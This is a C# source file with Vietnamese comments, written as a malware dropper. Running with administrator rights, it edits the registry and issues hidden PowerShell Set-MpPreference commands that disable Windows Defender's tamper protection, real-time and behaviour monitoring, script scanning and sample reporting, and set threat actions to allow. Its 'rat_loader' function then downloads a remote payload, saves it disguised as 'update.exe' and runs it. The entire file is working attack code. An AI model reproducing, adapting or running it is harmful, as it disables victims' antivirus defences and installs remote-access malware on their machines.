using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Xml.Linq;
using Microsoft.Win32;

namespace DisableWinDefAndLoader
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string payload_url = "https://google.com/payload.exe"; // link để tải payload.
            if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)) return; // kiểm tra quyền administrator
            RegEdit(@"SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection", "0");
            RegEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", "1");
            RegEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring", "1");
            RegEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection", "1");
            RegEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");
            string args2 = "Get-MpPreference -verbose";
            string output = RunPS(args2);
            if (output == null)
            {
                Console.WriteLine("Không mở được Windows Defender preferences.");
                return;
            }
            if (output.Contains("DisableRealtimeMonitoring") && output.Contains("False"))
            {
                RunPS("Set-MpPreference -DisableRealtimeMonitoring $true");
            }
            if (output.Contains("DisableBehaviorMonitoring") && output.Contains("False"))
            {
                RunPS("Set-MpPreference -DisableBehaviorMonitoring $true");
            }
            if (output.Contains("DisableBlockAtFirstSeen") && output.Contains("False"))
            {
                RunPS("Set-MpPreference -DisableBlockAtFirstSeen $true");
            }
            if (output.Contains("DisableIOAVProtection") && output.Contains("False"))
            {
                RunPS("Set-MpPreference -DisableIOAVProtection $true");
            }
            if (output.Contains("DisablePrivacyMode") && output.Contains("False"))
            {
                RunPS("Set-MpPreference -DisablePrivacyMode $true");
            }
            if (output.Contains("SignatureDisableUpdateOnStartupWithoutEngine") && output.Contains("False"))
            {
                RunPS("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true");
            }
            if (output.Contains("DisableArchiveScanning") && output.Contains("False"))
            {
                RunPS("Set-MpPreference -DisableArchiveScanning $true");
            }
            if (output.Contains("DisableIntrusionPreventionSystem") && output.Contains("False"))
            {
                RunPS("Set-MpPreference -DisableIntrusionPreventionSystem $true");
            }
            if (output.Contains("DisableScriptScanning") && output.Contains("False"))
            {
                RunPS("Set-MpPreference -DisableScriptScanning $true");
            }
            if (output.Contains("SubmitSamplesConsent") && output.Contains("False"))
            {
                RunPS("Set-MpPreference -SubmitSamplesConsent 2");
            }
            if (output.Contains("MAPSReporting") && output.Contains("False"))
            {
                RunPS("Set-MpPreference -MAPSReporting 0");
            }
            if (output.Contains("HighThreatDefaultAction") && output.Contains("False"))
            {
                RunPS("Set-MpPreference -HighThreatDefaultAction 6 -Force");
            }
            if (output.Contains("ModerateThreatDefaultAction") && output.Contains("False"))
            {
                RunPS("Set-MpPreference -ModerateThreatDefaultAction 6");
            }
            if (output.Contains("LowThreatDefaultAction") && output.Contains("False"))
            {
                RunPS("Set-MpPreference -LowThreatDefaultAction 6");
            }
            if (output.Contains("SevereThreatDefaultAction") && output.Contains("False"))
            {
                RunPS("Set-MpPreference -SevereThreatDefaultAction 6");
            }

            // tải payload
            bool downloadfile = rat_loader(payload_url);

        }

        private static void RegEdit(string regPath, string name, string value) //chỉnh sửa Regedit
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath, true))
                {
                    if (key == null)
                    {
                        RegistryKey createdKey = Registry.LocalMachine.CreateSubKey(regPath);
                        if (createdKey != null)
                        {
                            createdKey.SetValue(name, value, RegistryValueKind.DWord);
                            createdKey.Close();
                        }
                        return;
                    }
                    object currentValue = key.GetValue(name);
                    if (currentValue == null || currentValue.ToString() != value)
                    {
                        key.SetValue(name, value, RegistryValueKind.DWord);
                    }
                }
            }
            catch (UnauthorizedAccessException ex)
            {
            }
            catch (Exception ex)
            {
            }
        }
        private static string RunPS(string args) // khởi tạo powershell
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = args,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                };

                using (Process proc = new Process())
                {
                    proc.StartInfo = psi;
                    proc.Start();

                    // Đọc đầu ra
                    string output = proc.StandardOutput.ReadToEnd();

                    // Đợi tiến trình kết thúc
                    proc.WaitForExit();

                    return output;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
                return null;
            }
        }


        static bool rat_loader(string url) //tải payload từ link (google.com/payload.exe)
        {
            try
            {
                string fileName = "update.exe";

                // Tạo một đối tượng WebClient để tải file từ URL
                using (WebClient webClient = new WebClient())
                {
                    // Tải file từ URL và lưu vào thư mục hiện tại với tên là "update.exe"
                    webClient.DownloadFile(url, fileName);
                }

                // Thực thi file update.exe
                Process.Start(fileName);

                return true; // Trả về true nếu tải và thực thi thành công
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
                return false; // Trả về false nếu có lỗi xảy ra
            }
        }
    }
}
